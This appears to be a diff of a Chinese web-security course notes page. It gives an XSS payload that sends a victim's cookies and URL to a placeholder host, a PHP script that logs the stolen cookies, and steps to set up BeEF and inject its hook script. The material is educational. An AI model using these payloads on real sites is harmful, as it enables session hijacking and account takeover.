@@ -3603,22 +3603,7 @@ logindata.Password =encodeURI(encrypt.encrypt(numPassword));
 <p><img src="/images/062-8.png"></p>
 <p><strong><font style="color:#000000;">换一个浏览器本身是没有管理员Cookie，替换成我们获取的Cookie后发现登录成功！</font></strong></p>
 </blockquote>
-<h2 id="盗取Cookie两种方式"><a href="#盗取Cookie两种方式" class="headerlink" title="盗取Cookie两种方式"></a>盗取Cookie两种方式</h2><h3 id="1、手工（了解盗取Cookie的原理）"><a href="#1、手工（了解盗取Cookie的原理）" class="headerlink" title="1、手工（了解盗取Cookie的原理）"></a>1、手工（了解盗取Cookie的原理）</h3><script>var url='http://xx.xx.xx.xx/getcookie.php?u='+window.location.href+'&c='+document.cookie;document.write("<img src="+url+" />");</script>
-
-<p>接收：</p>
-<?php
-
-$url=$_GET['u'];
-
-$cookie=$_GET['c'];
-
-$fp =fopen('cookie.txt',"a");
-
-fwrite($fp,$url."|".$cookie."\n");
-
-fclose($fp);
-
-?>
+<h2 id="盗取Cookie两种方式"><a href="#盗取Cookie两种方式" class="headerlink" title="盗取Cookie两种方式"></a>盗取Cookie两种方式</h2><h3 id="1、手工（了解盗取Cookie的原理）"><a href="#1、手工（了解盗取Cookie的原理）" class="headerlink" title="1、手工（了解盗取Cookie的原理）"></a>1、手工（了解盗取Cookie的原理）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;var url=&#x27;http://xx.xx.xx.xx/getcookie.php?u=&#x27;+window.location.href+&#x27;&amp;c=&#x27;+document.cookie;document.write(&quot;&lt;img src=&quot;+url+&quot; /&gt;&quot;);&lt;/script&gt;</span><br><span class="line">接收：</span><br><span class="line">&lt;?php</span><br><span class="line">$url=$_GET[&#x27;u&#x27;];</span><br><span class="line">$cookie=$_GET[&#x27;c&#x27;];</span><br><span class="line">$fp =fopen(&#x27;cookie.txt&#x27;,&quot;a&quot;);</span><br><span class="line">fwrite($fp,$url.&quot;|&quot;.$cookie.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p><font style="background-color:#81BBF8;">这段代码很简单就不解释了，不会就去ai吧</font></p>
 <p><font style="background-color:#81BBF8;">这里就不演示了，自己买一台云服务器然后把接受代码部署好，在漏洞点输入xss语句即可</font></p>
@@ -3654,7 +3639,8 @@ fclose($fp);
 <p>apt install docker-compose</p>
 <p>搭建：docker run –rm -p 3000:3000 janes&#x2F;beef</p>
 <p>访问：<a href="http://ip/ui/panel">http://ip/ui/panel</a> （账号密码：beef&#x2F;beef）</p>
-<p>利用：<script src="http://ip:3000/hook.js"></script></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用：&lt;script src=&quot;http://ip:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>小迪安全课程学习笔记(web攻防)</category>
